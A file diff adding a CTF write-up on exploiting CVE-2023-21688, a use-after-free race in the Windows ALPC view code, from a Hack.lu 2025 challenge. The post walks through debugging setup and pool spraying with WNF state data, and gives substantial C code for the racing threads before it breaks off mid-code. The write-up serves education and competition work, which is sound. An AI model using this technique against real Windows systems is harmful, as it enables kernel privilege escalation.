@@ -1,0 +1,1255 @@
+import { ChallengeInfo } from "#components/ChallengeInfo.js";
+
+export const title = "Hack.lu CTF 2025";
+export const description =
+    "I LOVE WINDOWS ITS AMAZING - Exploiting a race condition in the Windows kernel.";
+
+Writeup for Lokaltal, a Windows kernel pwn challenge from Hack.lu CTF 2025. Originally posted on the smiley blog: [https://ctf.gg/blog/lokaltal](https://ctf.gg/blog/lokaltal), written by unvariant and [@cope](https://ctf.gg/members/cope). Challenge was solved by unvariant, [@kroot](https://kroot.me/), and [@cope](https://ctf.gg/members/cope).
+
+<hr></hr>
+
+# lokaltal
+
+<span style="display:none;">
+
+Ignore this
+[^1][^2][^3][^4][^5][^6][^7][^8][^9][^10][^11][^12][^13][^14][^15][^16][^17][^18][^19][^20][^21][^22][^23][^24][^25][^26][^27][^28][^29][^30][^31][^32][^33][^34][^35][^36][^37]
+
+</span>
+
+<ChallengeInfo items={{
+    author: "SeTcbPrivilege",
+    solves: 2,
+    difficulty: "hard"
+}}>
+In this challenge, you will need to exploit CVE-2023-21688, a use-after-free vulnerability in the `AlpcpCreateView` function. We have ported the bug to the most recent version of Windows 11 25H2 at the time of writing. The attachment file contains the patched `ntoskrnl.exe` as well as the full challenge description, which contains instructions on setting up a local instance of the challenge for debugging. The VM image is linked in the README\.md in the archive because of its size (~17GB). You are provided with a `ynetd`-like interface to the remote, where you can submit a PE file that will be executed with a Low-Privileged AppContainer (LPAC) Token. Your goal is to elevate privileges and read the flag from `\\?\PHYSICALDRIVE2`. Good luck!
+
+Note: For local testing, it is recommended to connect to the VM via RDP, access is enabled with credentials `Administrator:password`.
+
+</ChallengeInfo>
+
+# Overview
+
+As mentioned by the challenge description, LOKALTAL is a Windows kernel challenge which patches CVE-2023-21688 into the latest Windows 11. The vulnerability lies in AlpcpCreateView, where a reference counted object can be used by userspace before its reference count is incremented, allowing for a race condition to occur resulting in a UAF'd object.
+
+The challenge takes in a PE executable as input, then runs the file in an LPAC (Less Privileged App Container), meaning the exploit starts in a very strict sandbox. The goal is a privilege escalation allowing for the flag on a different disk to be read.
+
+Since it was our first time doing Windows kernel exploitation, we assumed the race condition would be pretty straightforward to exploit. This blog post[^13] by the researcher of the CVE seemed to detail the exact steps in triggering the race: repeatedly delete an ALPC section view on one thread, create an ALPC section view on another, try to reclaim the potentially corrupted view, and repeat if failed.
+
+But, several questions arise - what is ALPC? How is a section view created? How does the view get reclaimed? How do we know that the view was reclaimed?
+
+# Debugging Setup
+
+To run the challenge locally, we used VMware Workstation with WinDbg on the host machine to debug. To run the challenge with VMware, the disks needed to be converted from .qcow2 to .vmdk. We used `qemu-img` to convert the disk files and create a disk from our fake flag file. flag.bin is a 32MB file with the flag at the start because VMWare does not like small disks.
+
+```sh open noheader
+qemu-img convert -f qcow2 -O vmdk disk.qcow2 disk.vmdk
+qemu-img convert -f qcow2 -O vmdk efiguard.qcow2 efiguard.vmdk
+qemu-img convert -O vmdk flag.bin flag.vmdk
+```
+
+Once converted, we had some trouble during VM creation. Before adding the EfiGuard disk, disk encryption and Secure Boot need to be disabled. To disable disk encryption, open the VM's settings, navigate to `Options->Access Control`, then press `Remove Encryption` and enter the encryption password configured during VM creation. To disable Secure Boot, navigate to `Options->Advanced` and make sure `Enable Secure Boot` is unchecked. If a TPM device exists, remove it in the `Hardware` panel then try again.
+
+Now the EfiGuard disk, the challenge disk, and the flag disk can be added. Once readded, the TPM and encryption should be reenabled.
+
+We also need to define the boot order to make sure that the VM always boots into the correct disk. This can be set permanently by adding the following lines into the VM's .vmx file, which can be found in the VM's directory. (`nvme0:1` is assuming you added the EfiGuard disk directly after the main disk.)
+
+```text open noheader
+bios.bootOrder = "hdd"
+bios.hddOrder = "nvme0:1"
+```
+
+Once the VM is booted, we used the commands in the VM given by the provided `README` to enable debugging. We can then attach to the VM with WinDbg on the host machine.
+
+```sh open noheader
+bcdedit /debug on
+bcdedit /dbgsettings net hostip:<DEBUGGER_IP> port:50000
+```
+
+To quickly recover from a kernel crash, we created a snapshot at this point to revert to a state before we ran any exploits.
+
+# Some Windows Stuff
+
+Handles are opaque references to objects, similar to a Linux's file descriptor.
+
+Many Windows types have a similarly named `P<type>`, which is a pointer type (same as `<type> *`).
+
+Windows doesn't document its userland syscalls (here is a list of reverse engineered syscalls: https://j00ru.vexillium.org/syscalls/nt/64/), but instead exposes APIs for syscall usage. Because of this, API functions that are not defined in headers need to be manually resolved. The address of functions can be found with `GetProcAddress`, and the type for the function can be found on the internet (ex. NtDoc[^14] or Process Hacker[^15]).
+
+# A Quick Explanation of the Windows Kernel Heap
+
+The heap in the Windows kernel is called the pool. The pool is split into two main groups - the paged and non-paged pools.
+
+Non-paged pool allocations always reside in memory, while paged pool allocations can be moved to the disk when RAM is limited. Typically, most data is stored in the paged pool unless it requires speedy access.
+
+Allocations sizes are rounded to the next 0x10 aligned number, and chunks have a 0x10 byte header that contain flags and a 4 byte identifier for the type of allocation.
+
+The pool an allocation is sent to is determined by the flags specified during allocation. Non-paged allocations will never allocate into a paged pool and vice versa. Small allocations of different sizes also are not allocated onto the same page (this isn't always true, the variable size allocator tries to fit any size it can, but for simplicity sake we can pretend it doesn't exist), and have their own pages dedicated to their size. This means that abusing a UAF will require finding a kernel object of the same allocation type and of the same or variable size to fill the freed chunk.
+
+Since this explanation is very naive and only covers what is needed to understand the challenge, you'd definitely want to read more about the pool elsewhere if you want a better understanding of it, such as the Windows Internals book or posts like these[^4][^5].
+
+In the scope of this challenge, the entire exploit will use the paged pool.
+
+# What is ALPC?
+
+ALPC (Advanced Local Procedure Call) is the inter-process communication protocol used by the Windows kernel.
+
+Since ALPC is undocumented by Windows as it is intended to only be used internally, we relied on what we could find online. Fortunately, there are many good resources on ALPC, most notably these articles by csandker[^7][^10].
+
+# Getting a Section View
+
+Creating an ALPC Section View requires an ALPC Port and an ALPC Section. These objects can be created using the `NtAlpcCreatePort` and `NtAlpcCreatePortSection` APIs respectively. The functions are defined as follows:
+
+```c open noheader
+typedef struct _ALPC_PORT_ATTRIBUTES {
+    unsigned long Flags;
+    SECURITY_QUALITY_OF_SERVICE SecurityQos;
+    unsigned __int64 MaxMessageLength;
+    unsigned __int64 MemoryBandwidth;
+    unsigned __int64 MaxPoolUsage;
+    unsigned __int64 MaxSectionSize;
+    unsigned __int64 MaxViewSize;
+    unsigned __int64 MaxTotalSectionSize;
+    ULONG DupObjectTypes;
+#ifdef _WIN64
+    ULONG Reserved;
+#endif
+} ALPC_PORT_ATTRIBUTES, *PALPC_PORT_ATTRIBUTES;
+
+typedef NTSTATUS(NTAPI *__NtAlpcCreatePort)(
+    _Out_ PHANDLE PortHandle,
+    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
+    _In_opt_ PALPC_PORT_ATTRIBUTES PortAttributes
+);
+```
+
+```c open noheader
+typedef NTSTATUS(NTAPI *__NtAlpcCreatePortSection)(
+    _In_ HANDLE PortHandle,
+    _In_ ULONG Flags,
+    _In_opt_ HANDLE SectionHandle,
+    _In_ SIZE_T SectionSize,
+    _Out_ PHANDLE AlpcSectionHandle,
+    _Out_ PSIZE_T ActualSectionSize
+);
+```
+
+Although the function arguments look inconvenient to set up, most of them can be set to `NULL`.
+
+```c open noheader
+HANDLE serverPort;
+status = NtAlpcCreatePort(&serverPort, NULL, NULL);
+printf("NtAlpcCreatePort = 0x%lx\n", status);
+printf("serverPort = %p\n", serverPort);
+```
+
+```c open noheader
+SIZE_T actualSize = 0;
+status = NtAlpcCreatePortSection(serverPort, NULL, NULL, 0x1000, &alpcSection, &actualSize);
+printf("NtAlpcCreatePortSection: 0x%lx\n", status);
+printf("alpcSection: %p\n", alpcSection);
+```
+
+The two functions will return the handles to the respective objects in the `_Out_ PHANDLE` argument, which provides a reference to the port and section.
+
+Creating a view uses `NtAlpcCreateSectionView`, using the port handle and a `_ALPC_DATA_VIEW_ATTR` structure containing the section handle.
+
+```c open noheader
+typedef struct _ALPC_MESSAGE_ATTRIBUTES {
+    ULONG AllocatedAttributes;
+    ULONG ValidAttributes;
+} ALPC_MESSAGE_ATTRIBUTES, *PALPC_MESSAGE_ATTRIBUTES;
+typedef struct _ALPC_DATA_VIEW_ATTR {
+    ULONG Flags;
+    HANDLE SectionHandle;
+    PVOID ViewBase;
+    SIZE_T ViewSize;
+} ALPC_DATA_VIEW_ATTR, *PALPC_DATA_VIEW_ATTR;
+
+typedef NTSTATUS(NTAPI *__NtAlpcCreateSectionView)(
+    _In_ HANDLE PortHandle,
+    _Reserved_ ULONG Flags,
+    _Inout_ PALPC_DATA_VIEW_ATTR ViewAttributes
+);
+```
+
+We used a helper function to create views.
+
+```c open noheader
+typedef struct {
+    ALPC_MESSAGE_ATTRIBUTES msg_attr;
+    ALPC_DATA_VIEW_ATTR view_attr;
+} msg_view_attr;
+```
+
+```c open noheader
+void *AttachView(HANDLE port, HANDLE SectionHandle) {
+    NTSTATUS status;
+    msg_view_attr attrs = {0};
+    PALPC_DATA_VIEW_ATTR dv = &attrs.view_attr;
+    dv->Flags = 0;
+    dv->SectionHandle = SectionHandle;
+    dv->ViewBase = NULL;
+    dv->ViewSize = 0x1000;
+
+    status = NtAlpcCreateSectionView(port, 0, dv);
+    if (status < 0) {
+        printf("NtAlpcCreateSectionView = 0x%lx\n", status);
+    }
+
+    return dv->ViewBase;
+}
+```
+
+The view will be mapped into userspace as the address returned in `_ALPC_DATA_VIEW_ATTR->ViewBase`.
+
+`NtAlpcDeleteSectionView` can be used to delete the view:
+
+```c open noheader
+typedef NTSTATUS(NTAPI *__NtAlpcDeleteSectionView)(
+    _In_ HANDLE PortHandle,
+    _Reserved_ ULONG Flags,
+    _In_ PVOID ViewBase
+);
+```
+
+```c open noheader
+NtAlpcDeleteSectionView(serverPort, 0, dataViewAttrs->ViewBase);
+```
+
+`_KALPC_VIEW` stores information about the view. Since it's allocated/freed by these functions, it is the vulnerable object for this challenge.
+
+```c open noheader
+struct _KALPC_VIEW
+{
+    struct _LIST_ENTRY_1 ViewListEntry;
+    struct _KALPC_REGION* Region;
+    struct _ALPC_PORT* OwnerPort;
+    struct _EPROCESS_1* OwnerProcess;
+    void* Address;
+    uint64_t Size;
+    void* SecureViewHandle;
+    void* WriteAccessHandle;
+    union
+    {
+        struct
+        {
+            union
+            {
+                uint32_t WriteAccess;
+                uint32_t AutoRelease;
+                uint32_t ForceUnlink;
+                uint32_t SystemSpace;
+            } __bitfield0;
+        } s1;
+    } u1;
+    uint32_t NumberOfOwnerMessages;
+    struct _LIST_ENTRY_1 ProcessViewListEntry;
+};
+```
+
+The section view's (and many other object's) reference count and other information is stored in a `_BLOB` object that is prepended to the object, stored in the same chunk.
+
+```c open noheader
+struct _BLOB
+{
+    union
+    {
+        struct _LIST_ENTRY_1 ResourceList;
+        struct _SLIST_ENTRY_1 FreeListEntry;
+    } __inner0;
+    union
+    {
+        struct
+        {
+            union
+            {
+                uint8_t ReferenceCache;
+                uint8_t Lookaside;
+                uint8_t Initializing;
+                uint8_t Deleted;
+            } __bitfield0;
+        } s1;
+        uint8_t Flags;
+    } u1;
+    uint8_t ResourceId;
+    int16_t CachedReferences;
+    __padding char _padding[4];
+    int64_t ReferenceCount;
+    struct _EX_PUSH_LOCK Lock;
+};
+```
+
+It's worth noting that the address `NtAlpcCreateSectionView` maps in the userspace will be the same when only one section's view is constantly being created and deleted. This will be important since the kernel searches for ALPC views using the userspace address instead of a section handle.
+
+# The Race Condition
+
+Looking at the patched `ntoskrnl.exe` in Binary Ninja, we got a good idea of what we were working with.
+`AlpcpCreateView+0x271 -> AlpcpCreateView+0x53f`:
+
+```c open noheader
+AlpcpInsertResourcePort(PORT: Alpc_Port,
+                        view: &blob->alpc_view.ViewListEntry.Flink);
+void* rax_14 = KeAbPreAcquire(&OwnerProcess->AlpcContext, nullptr);
+OwnerProcess->AlpcContext.Lock.__inner0.__bitfield0 |= 1;
+
+if (test_bit(OwnerProcess->AlpcContext.Lock.__inner0.__bitfield0, 0))
+    ExfAcquirePushLockExclusiveEx(
+        &OwnerProcess->AlpcContext.Lock.__inner0.__bitfield0.Locked,
+        rax_14,
+        &OwnerProcess->AlpcContext
+    );
+
+if (rax_14 != 0)
+    *(rax_14 + 0xa) = 1;
+
+blob->alpc_view.ProcessViewListEntry.Blink =
+    OwnerProcess->AlpcContext.ViewListHead.Blink;
+blob->alpc_view.ProcessViewListEntry.Flink =
+    &OwnerProcess->AlpcContext.ViewListHead;
+OwnerProcess->AlpcContext.ViewListHead.Blink->Flink =
+    &blob->alpc_view.ProcessViewListEntry;
+OwnerProcess->AlpcContext.ViewListHead.Blink =
+    &blob->alpc_view.ProcessViewListEntry;
+OwnerProcess->AlpcContext.Lock.__inner0.__bitfield0 -= 1;
+
+if (((OwnerProcess->AlpcContext.Lock.__inner0.__bitfield0).b & 6) == 2)
+    ExfTryToWakePushLock(&OwnerProcess->AlpcContext);
+
+KeAbPostRelease(&OwnerProcess->AlpcContext);
+
+if (((Alpc_Region->u1.s1).b & 1) != 0)
+    Alpc_Region->ReadWriteView = &blob->alpc_view;
+
+ret_val = 0;
+*chunk_store = &blob->alpc_view;
+AlpcpReferenceBlob(view: &blob->alpc_view);
+```
+
+Here is a brief overview of what the function is doing, we've left out some aspects since they aren't too important:
+
+- Prior to the code block, the `AlpcpCreateView` creates the chunk to be used for the view with an initial reference count of 1
+- The chunk is added to the ALPC port's resource port list, where it is now referenceable by `NtAlpcDeleteSectionView`
+- The chunk is added to the process view list and the owner process
+- The reference count is incremented
+- The view base and size are written to the structure
+- The function is done, and the reference count is decremented
+
+`AlpcpInsertResourcePort` does not increment the reference count by itself, so for the entire code block, the reference count is 1 less than it should be.
+
+The address has not been inserted into `ViewBase` yet but will be known since it is reused. This means that the chunk can be deleted before the last `AlpcpReferenceBlob` call, which will cause a UAF.
+
+The race condition to create a UAF'd section view (`_KALPC_VIEW`) is actually very simple to hit and verify. Constantly deleting on one thread and constantly creating on another should make the race condition succeed, as it's pretty easy to hit and will not crash on failure. Verifying the race doesn't even require any code! That's because the kernel crashes when the race succeeds. But why?
+
+Checking the crash in WinDbg shows a negative reference count, because when the reference count reaches 0, `AlpcpReferenceBlob` will not increment the count since the object should have no way of being accessed.
+
+To visualize the problem, here is what we expected versus what happens:
+
+Expected:
+![expected race timeline](imgs/race_timeline_expected.png/raw)
+
+> Reading it now, we realized this would cause a double free, which would probably get caught by the kernel. We never triggered this though since this isn't the actual behavior XD.
+
+Reality:
+![reality race timeline](imgs/race_timeline_reality.png/raw)
+
+It's more problematic that deleting the view removes its entry from the ALPC port, so the view will still be inaccessible even if the UAF'd chunk does not cause a kernel crash.
+
+It's worth noting that there is a small chance that the race happens right after the call to `AlpcpInsertResourcePort`, meaning the chunk could be freed before some references are added, but we decided this was too small of a race and is prone to kernel crashes, making it very hard to pull off consistently.
+
+> A little note from the future: The solution that won the competition[^26] used a function that modifies a view after creation (`AlpcpExposeViewAttributeInSenderContext`), meaning the UAF can be exploited using this function. We didn't find this so we took a different approach.
+
+To get around the negative reference count and the view being inaccessible, we performed another race that sprays objects to reclaim the view after deletion, but still takes place within the original race window. Given that the reclaiming object can overwrite the reference count with a 1, the reclaimed view can be freed again successfully.
+
+This happens since `AlpcpCreateView` decrements the reference count at the end of the function, then checks if it is 0 and calls free if true. Since we managed to get a new object into the chunk before the reference count is decremented, that new object will be freed. We now have a UAF primitive with the reclaiming object we just sprayed.
+
+Contrary to just triggering the bug, this is a very tight race and took us around a week to get working.
+
+# Finding a Sprayable Object
+
+We spent a good chunk of time testing potential spraying objects. The object we spray needs to be able to reclaim a freed `_KALPC_VIEW`, which is a paged pool allocation of size 0x90 (0xa0 with the pool header), and have controllable data so the reference count and other requirements can be set.
+
+## PipeAttribute
+
+The `PipeAttribute` structure is a key-value pair of variable size that is stored in the paged pool. It has a header of 0x28 followed by the key and value, seperated by a null byte. The structure is allocated using `NtFsControlFile`[^27] with the FSCTL code 0x11003c (`FSCTL_PIPE_SET_HANDLE_ATTRIBUTE`[^28]).
+
+```c open noheader
+__kernel_entry NTSYSCALLAPI NTSTATUS NtFsControlFile(
+  [in]            HANDLE           FileHandle,
+  [in, optional]  HANDLE           Event,
+  [in, optional]  PIO_APC_ROUTINE  ApcRoutine,
+  [in, optional]  PVOID            ApcContext,
+  [out]           PIO_STATUS_BLOCK IoStatusBlock,
+  [in]            ULONG            FsControlCode,
+  [in, optional]  PVOID            InputBuffer,
+  [in]            ULONG            InputBufferLength,
+  [out, optional] PVOID            OutputBuffer,
+  [in]            ULONG            OutputBufferLength
+);
+```
+
+```c open noheader
+HANDLE read_pipe;
+HANDLE write_pipe;
+
+#define PA_LEN (0x90-0x28)
+char attribute[PA_LEN];
+memset(attribute, 0x41, PA_LEN);
+attribute[0] = 'Z';
+attribute[1] = '\0';
+IO_STATUS_BLOCK ntfsStatus;
+char output[0x100];
+
+status = CreatePipe(&read_pipe, &write_pipe, NULL, NULL);
+if (!status) {
+    printf("CreatePipe Fail! error=0x%lx\n", GetLastError());
+}
+
+status = NtFsControlFile(write_pipe, NULL, NULL, NULL, &ntfsStatus, 0x11003c, attribute, PA_LEN, output, sizeof(output));
+if (status) {
+    printf("NtFsControlFile Fail! error=0x%lx\n", status);
+}
+```
+
+Reading the attribute uses the same `NtFsControlFile` function but with code 0x110038 (`FSCTL_PIPE_GET_HANDLE_ATTRIBUTE`[^29]). The structure allows for an arbitrary read primitive if an overflow into the header of the `PipeAttribute` is obtained.
+
+Unfortunately, this structure is unusable because of the LPAC restrictions. The `DisallowFsctlSystemCalls` flag in the `PROCESS_MITIGATION_SYSTEM_CALL_DISABLE_POLICY` structure[^30] sets the allowed `NtfsControlFile` codes to a whitelist, which obviously does not include the FSCTL code to create a `PipeAttribute`.
+
+`PipeAttribute`s are also unusable for the initial spray because most of the `_BLOB` is stored in the structure's header, and contains important fields needed to free the view such as the reference count or structure type.
+
+The original writeup for the `PipeAttribute` structure can be found here[^18].
+
+## Mutex Names
+
+Mutex names are a null-terminated `WCHAR` string stored in the paged pool, with their size being the name length rounded up to the nearest valid size (no additional header). They are created using `CreateMutexA`[^31] or `CreateMutexW`[^32], the `A` variant converting the input name into a `WCHAR` string and the `W` variant taking the input name as a `WCHAR` string. Mutex names must be unique.
+
+```c open noheader
+HANDLE CreateMutexA(
+  [in, optional] LPSECURITY_ATTRIBUTES lpMutexAttributes,
+  [in]           BOOL                  bInitialOwner,
+  [in, optional] LPCSTR                lpName
+);
+```
+
+```c open noheader
+HANDLE CreateMutexW(
+  [in, optional] LPSECURITY_ATTRIBUTES lpMutexAttributes,
+  [in]           BOOL                  bInitialOwner,
+  [in, optional] LPCWSTR               lpName
+);
+```
+
+```c open noheader
+WCHAR wname[0x100] = { 0 };
+char *name = (char *)wname;
+memset(name, 0x20, 0x90);
+
+HANDLE m = CreateMutexW(NULL, FALSE, wname);
+if (m == NULL) {
+    printf("CreateMutexW failed!\n");
+}
+```
+
+Since the string is a null-termated `WCHAR` string, for every two bytes only one can be null, meaning it's impossible to set a 64-bit variable like `_BLOB->ReferenceCount` to anything smaller than 0x0001000100010001 ("\x00\x01\x00\x01\x00\x01\x00\x01").
+
+However, their lack of header makes them good at overwriting the start of UAF'd objects, as long as the values don't contain too many null bytes.
+
+## WNF State Data
+
+The `_WNF_STATE_DATA` structure stores up to a page of data (normally 0x1000) for a `_WNF_STATE_NAME`, and has a header of size 0x10. The name can be created with `NtCreateWnfStateName`, the data can be created/updated with `NtUpdateWnfStateData`, the data can be read with `NtQueryWnfStateData`, the data can deleted with `NtDeleteWnfStateData`.
+
+```c open noheader
+typedef struct _WNF_STATE_NAME {
+    ULONG Data2[2];
+} WNF_STATE_NAME, *PWNF_STATE_NAME;
+
+typedef enum _WNF_STATE_NAME_LIFETIME {
+    WnfWellKnownStateName,
+    WnfPermanentStateName,
+    WnfPersistentStateName,
+    WnfTemporaryStateName
+} WNF_STATE_NAME_LIFETIME;
+
+typedef enum _WNF_DATA_SCOPE {
+    WnfDataScopeSystem,
+    WnfDataScopeSession,
+    WnfDataScopeUser,
+    WnfDataScopeProcess,
+    WnfDataScopeMachine,
+    WnfDataScopePhysicalMachine
+} WNF_DATA_SCOPE;
+
+typedef struct _WNF_TYPE_ID {
+    GUID TypeId;
+} WNF_TYPE_ID, *PWNF_TYPE_ID;
+typedef const WNF_TYPE_ID *PCWNF_TYPE_ID;
+
+typedef ULONG WNF_CHANGE_STAMP, *PWNF_CHANGE_STAMP;
+```
+
+```c open noheader
+typedef NTSTATUS(NTAPI *__NtCreateWnfStateName)(
+    _Out_ PWNF_STATE_NAME StateName,
+    _In_ WNF_STATE_NAME_LIFETIME NameLifetime,
+    _In_ WNF_DATA_SCOPE DataScope,
+    _In_ BOOLEAN PersistData,
+    _In_opt_ PCWNF_TYPE_ID TypeId,
+    _In_ ULONG MaximumStateSize,
+    _In_ PSECURITY_DESCRIPTOR SecurityDescriptor
+);
+```
+
+```c open noheader
+typedef NTSTATUS(NTAPI *__NtUpdateWnfStateData)(
+    _In_ PWNF_STATE_NAME StateName,
+    _In_reads_bytes_opt_(Length) const VOID *Buffer,
+    _In_opt_ ULONG Length,
+    _In_opt_ PCWNF_TYPE_ID TypeId,
+    _In_opt_ const PVOID ExplicitScope,
+    _In_ WNF_CHANGE_STAMP MatchingChangeStamp,
+    _In_ ULONG CheckStamp
+);
+```
+
+```c open noheader
+typedef NTSTATUS(NTAPI *__NtQueryWnfStateData)(
+    _In_ PWNF_STATE_NAME StateName,
+    _In_opt_ PCWNF_TYPE_ID TypeId,
+    _In_opt_ const VOID *ExplicitScope,
+    _Out_ PWNF_CHANGE_STAMP ChangeStamp,
+    _Out_writes_bytes_to_opt_(*BufferSize, *BufferSize) PVOID Buffer,
+    _Inout_ PULONG BufferSize
+);
+```
+
+```c open noheader
+typedef NTSTATUS(NTAPI *__NtDeleteWnfStateData)(
+    _In_ PWNF_STATE_NAME StateName,
+    _In_opt_ const VOID *ExplicitScope
+);
+```
+
+Initially, we thought this structure was also blocked. We were still getting `STATUS_ACCESS_VIOLATION` errors when trying to call `NtUpdateWnfStateData`. After messing with the `SecurityDescriptor` in `NtCreateWnfStateName` we got it to work.
+
+The solution was to use `GetSecurityInfo` to retrieve the current process's security descriptor and pass that to `NtCreateWnfStateName` instead of trying to create one ourselves.
+
+```c open noheader
+#define WNF_MAXBUFSIZE (0x1000)
+WNF_STATE_NAME StateName;
+PSECURITY_DESCRIPTOR pSD;
+
+status = GetSecurityInfo(GetCurrentProcess(), SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, NULL, NULL, &pSD);
+if (status) {
+    printf("GetSecurityInfo Failed! error=0x%lx\n", status);
+    return -1;
+}
+
+status = NtCreateWnfStateName(&StateName, WnfTemporaryStateName, WnfDataScopeUser, FALSE, 0, WNF_MAXBUFSIZE, pSD);
+if (status) {
+    printf("NtCreateWnfStateName failed! error=0x%lx\n", status);
+}
+```
+
+```c open noheader
+char StateData[0x1000];
+memset(StateData, 0x20, sizeof(StateData));
+status = NtUpdateWnfStateData(&StateName, StateData, (0x90 - 0x10), 0, 0, 0, 0);
+if (status) {
+    printf("NtUpdateWnfStateData failed! error=0x%lx\n", status);
+}
+```
+
+```c open noheader
+char data[0x1000];
+ULONG dataSize = sizeof(data);
+WNF_CHANGE_STAMP stamp = 0;
+status = NtQueryWnfStateData(&StateName, 0, NULL, &stamp, &data, &dataSize);
+if (status) {
+    printf("NtQueryWnfStateData failed! error = 0x%lx\n", status);
+} else {
+    printf("dataSize = 0x%lx\n", dataSize);
+    printf("Data: \"");
+    _write(1, data, dataSize);
+    printf("\"\n");
+}
+```
+
+```c open noheader
+status = NtDeleteWnfStateData(&StateName, NULL);
+if (status) {
+    printf("NtDeleteWnfStateData = 0x%lx\n", status);
+}
+```
+
+The header looks like this:
+
+```c open noheader
+typedef struct {
+    UINT32 Header;
+    UINT32 AllocatedSize;
+    UINT32 DataSize;
+    UINT32 ChangeStamp;
+} _WNF_STATE_DATA;
+```
+
+`_WNF_STATE_DATA->DataSize` is what determines how much data `NtQueryWnfStateData` reads, so this can be overwritten for out-of-bounds read/write (the write will still be limited to a page of data or 0x1000 bytes).
+
+The structure works for spraying, but since it's a long function it makes the race window harder to hit. Unfortunately, we did not find any other structure that worked, so we decided to stick with this.
+
+# The Race Condition (works) (not clickbait)
+
+The race condition will be successful when:
+
+- `NtAlpcCreateSectionView` allocates a view in `AlpcpCreateView` and calls `AlpcpInsertResourcePort` with the view to make it accessible by userspace
+- `NtAlpcDeleteSectionView` frees the view since the reference count has not been incremented, using the pre-calculated address the view is mapped in userspace
+- A `_WNF_STATE_DATA` reclaims the view and sets ReferenceCount to 1
+- `AlpcpDereferenceBlobEx` is called at the end of `NtAlpcCreateSectionView`, decrementing the reference count to 0 and freeing the object, leading to a UAF'd object
+
+Technically, this can be done by spamming create, delete, and spray functions in their own threads, but that leads to uncontrollable kernel crashes most of the time. We need some way to consistently avoid the crashes while synchronizing the threads.
+
+## Core Affinities and Process and Thread Priorities
+
+A thread can be pinned to a core using `SetThreadAffinityMask`[^33], where the 1 bits in the mask specify which cores the thread is allowed to use. Specifying this allows us to configure which threads run concurrently, but also which threads cannot run concurrently.
+
+```c open noheader
+#define AFFINITY_CORE0 (1 << 0)
+#define AFFINITY_CORE1 (1 << 1)
+
+status = SetThreadAffinityMask(self, AFFINITY_CORE0);
+printf("SetThreadAffinityMask = 0x%lx\n", status);
+```
+
+Windows scheduling allows a process to set a base priority for its threads and also a per-thread priority. The process priority can be set using `SetPriorityClass`[^21], and thread priority can be set using `SetThreadPriority`[^22]. Priority is used by the scheduler to determine which thread should run on each core. Higher priority threads will run forever until they finish or need to wait (I/O operation, waiting on mutex), and only then lower priority threads will be able to run. There is a base priority `REALTIME_PRIORITY_CLASS` which allows for over double the priority value (16-31 priority), but this is locked behind administrator privileges (unless?). Important kernel-level processes reside in realtime priority, so user threads with this priority have the potential to stop them from running.
+
+```c open noheader
+status = SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
+printf("SetPriorityClass = 0x%lx\n", status);
+status = SetThreadPriority(self, THREAD_PRIORITY_ABOVE_NORMAL);
+printf("SetThreadPriority = 0x%lx\n", status);
+```
+
+Windows scheduling also boosts a thread's affinity when it has not run for a while, and this can be disabled with `SetThreadPriorityBoost`[^24].
+
+```c open noheader
+status = SetThreadPriorityBoost(self, TRUE); // true means boost is disabled
+printf("SetThreadPriorityBoost = 0x%lx\n", status);
+```
+
+With these functions, we can make our race more consistent. We used a method discussed in this Google Project Zero post[^17] that creates two threads:
+
+- High priority thread that waits for input from a pipe before doing something
+- Low priority thread that constantly does something
+
+> The technique from the p0 blog post was written for linux, but almost everything applies to windows. Some nuance is still involved, and internally windows manages events like io completion using application procedure calls (APCs) which come with the own priority levels and management.
+
+These threads should be on the same core. The idea is that the pipe input might land inside the race window, giving a lot of time to exploit since the thread with the race is suspended.
+
+We applied this to our exploit by putting our deletion and spraying into the high priority thread and our creation into the low priority thread, then a trigger thread that sends input into the pipe and creates `_WNF_STATE_NAME` objects. Of course, the high and low priority threads are on one core, then the trigger is on the other.
+
+```c open noheader
+volatile long long flag = 0;
+HANDLE readPipe;
+HANDLE writePipe;
+
+HANDLE serverPort;
+HANDLE alpcSection = NULL;
+void *sectionViewAddr = NULL;
+
+#define WNF_SPRAY (0x50)
+#define WNF_MAXBUFSIZE (0x1000)
+
+WNF_STATE_NAME *StateNames;
+```
+
+Trigger:
+
+```c open noheader
+DWORD Trigger(void *ctx) {
+    NTSTATUS status;
+    char StateData[0x1000];
+    memset(StateData, 0xff, sizeof(StateData));
+
+    while (1) {
+        asm volatile("" ::: "memory");
+        flag = 1;
+        asm volatile("" ::: "memory");
+
+        StateNames = malloc(WNF_SPRAY * sizeof(WNF_STATE_NAME));
+        for (int i = 0; i < WNF_SPRAY; i++) {
+            status = NtCreateWnfStateName(&StateNames[i], WnfTemporaryStateName,
+                                          WnfDataScopeUser, FALSE, 0,
+                                          WNF_MAXBUFSIZE, pSD);
+            if (status != 0) {
+                printf("NtCreateWnfStateName failed! error=0x%lx\n",
+                       GetLastError());
+                return -1;
+            }
+        }
+
+        char ch = 0x41;
+        status = WriteFile(writePipe, &ch, 1, NULL, NULL);
+        if (status != 1) {
+            printf("status = 0x%lx\n", status);
+            exit(1);
+        }
+
+        while (flag) {
+            for (int i = 0; i < WNF_SPRAY; i++) {
+                status = NtUpdateWnfStateData(&StateNames[i], StateData,
+                                            (0x90 - 0x10), 0, 0, 0, 0);
+                if (status != 0) {
+                    printf("NtUpdateWnfStateData failed! error=0x%lx\n",
+                        GetLastError());
+                    printf("state = 0x%lx\n", status);
+                    return -1;
+                }
+            }
+        }
+    }
+}
+```
+
+Starver (Deleter and Sprayer):
+
+```c open noheader
+DWORD Starver(void *ctx) {
+    NTSTATUS status;
+    char ch;
+
+    while (1) {
+        status = ReadFile(readPipe, &ch, 1, NULL, NULL);
+        if (status != 1) {
+            printf("status = 0x%lx\n", status);
+            exit(1);
+        }
+
+        NtAlpcDeleteSectionView(serverPort, 0, sectionViewAddr);
+    }
+}
+```
+
+Creater (in main thread):
+
+```c open noheader
+while (1) {
+    dataViewAttrs->ViewBase = NULL;
+    dataViewAttrs->ViewSize = 0x1000;
+
+    status = NtAlpcCreateSectionView(serverPort, 0, dataViewAttrs);
+
+    asm volatile("" ::: "memory");
+    flag = 0;
+    asm volatile("" ::: "memory");
+
+    if (dataViewAttrs->ViewSize != 0x1000) {
+        puts("baaa");
+        break;
+    }
+}
+```
+
+Thread configurations:
+
+```c open noheader
+SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
+
+SetThreadAffinityMask(self, AFFINITY_CORE0);
